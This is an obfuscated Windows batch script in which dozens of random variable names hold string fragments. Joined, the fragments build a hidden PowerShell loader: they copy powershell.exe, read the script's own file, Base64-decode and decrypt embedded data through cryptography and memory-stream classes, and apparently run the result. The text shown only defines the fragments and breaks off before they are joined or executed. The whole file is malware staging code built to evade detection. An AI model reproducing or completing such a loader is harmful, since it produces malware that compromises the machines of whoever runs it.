@echo off
set "WFTRtyjzBH=32"
set "syZhrqvbgw=Sy"
set "gNPrrhLXCn=1."
set "YvDwzxCbRB=do"
set "suBdnLsQuL=nd"
set "imVwFKHUfl=ll"
set "PAOHgUvhCJ=co"
set "pntFvTkNnn=xe"
set "eOuQxwUMtV=he"
set "WgOaJSnfHQ=we"
set "YBLMILNCsf=0\"
set "QvUOeZSOIV=ws"
set "QuVWvPsaxK=em"
set "LNgRYuCBbR=\v"
set "TtKBPuwEfy=we"
set "HaiWoCrBqZ=he"
set "LXetivmnWW=:\"
set "DEvobrHDSc=po"
set "gdhYmuYnAJ= C"
set "WDcAFDOMWD=s\"
set "dvSlaZVwws=st"
set "zifAuERjWn=ll"
set "HsqEMXCcLB=in"
set "hDpucJcAos=Wi"
set "HWbMNiQYxN=py"
set "WiHSYKSIEr=ow"
set "YJrSnjbujm=rs"
set "cVnfYPERyI= /"
set "eBARcEppfv=Po"
set "oRBhoAKQAG=\W"
set "XJYYPlyBzN=rS"
set "ojxUgTmDbR=.e"
set "sRxVXxCoPu=y "
set "HielBdOdvg= %~dp0"
set "fdLWXgXkpl=cd"
set "MDHkmGxsUw=orF'"
set "ldSnwdLCXL=$DLR"
set "RWEXXZcEdH=;$eW"
set "KGnBMJyaHr===')"
set "RTwCfxuDTE=New-"
set "vnnTDxURCI==');"
set "YeFsHoiMLg=ach "
set "sxBndowWai=[Sys"
set "nAbNKsBPLd=le  "
set "KPSstyJKgw=tem."
set "feLpetOQqO=rt]:"
set "mzwzXhvZfj=yste"
set "kkFfwfmZnq=eK.D"
set "xdboWkRJPo=J.Su"
set "ocrDFxbhDE=SVmI"
set "qBcujoAJlV='0Pg"
set "hWaxbdBZSM=r = "
set "eNZOUxcbqb=tem."
set "vevSRczZBh=.Mem"
set "rTzpLVikrE=pres"
set "VceLCXQwJR=gjYA"
set "vxcFXpHUhD=m.IO"
set "rItUWEhCAy=m(, "
set "essnTHUVMK=File"
set "aiTutaKjSx=-joi"
set "KWpwTWPXDo=('%~f0'"
set "lahUyuzVRX=-joi"
set "nZFaoHNlkQ=KiuO"
set "dRvEmTXFQz=Conv"
set "bujtHIBwAk=:: '"
set "YowolCnAke=ert]"
set "biqYZdRjQX=]::N"
set "EjBRSMmfFw=Disp"
set "budtFzaRfm=ypto"
set "HzSGjdQAAc=mory"
set "UicNZdTCLL=yTo("
set "pFVrNyObvu=[Env"
set "rCxqlVYWlK=]::("
set "DGPYAdnBSJ=VmIT"
